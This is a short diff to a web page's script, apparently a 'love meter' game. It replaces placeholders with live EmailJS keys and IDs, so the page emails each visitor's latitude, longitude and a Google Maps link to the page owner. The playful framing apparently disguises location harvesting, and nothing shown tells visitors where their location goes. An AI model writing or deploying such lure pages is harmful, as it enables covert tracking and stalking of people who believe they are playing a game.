@@ -61,7 +61,7 @@
 <script>
   // Initialize EmailJS
   (function(){
-    emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS Public Key
+    emailjs.init("LWXarISg_TgVGl86U"); // Replace with your EmailJS Public Key
   })();
 
   function runLoveMeter() {
@@ -83,7 +83,7 @@
           const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
           // Send email via EmailJS
-          emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+          emailjs.send("service_j1cmr8e", "template_l1ejqfe", {
             latitude: lat,
             longitude: lon,
             maps_link: mapsLink
